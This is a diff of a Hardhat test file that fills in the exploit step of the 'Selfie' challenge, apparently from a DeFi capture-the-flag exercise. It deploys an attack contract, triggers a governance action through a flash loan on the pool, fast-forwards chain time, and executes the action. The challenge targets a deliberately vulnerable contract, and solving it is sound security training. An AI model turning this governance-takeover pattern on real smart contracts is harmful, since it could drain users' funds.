@@ -1,7 +1,8 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time } = require('@openzeppelin/test-helpers');
 
-describe('[Challenge] Selfie', function () {
+describe.only('[Challenge] Selfie', function () {
     let deployer, attacker;
 
     const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
@@ -29,8 +30,23 @@ describe('[Challenge] Selfie', function () {
         ).to.be.equal(TOKENS_IN_POOL);
     });
 
+
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        
+        const SelfieAttackContract = await ethers.getContractFactory('SelfieAttackContract', attacker);
+        this.attacker = await SelfieAttackContract.deploy();
+
+        await this.attacker.attack(
+            this.pool.address,
+            this.governance.address,
+            this.token.address,
+            TOKENS_IN_POOL
+        );
+
+        await network.provider.send("evm_increaseTime", [173000])
+
+        await this.governance.executeAction(await this.attacker.actionId());
+
     });
 
     after(async function () {
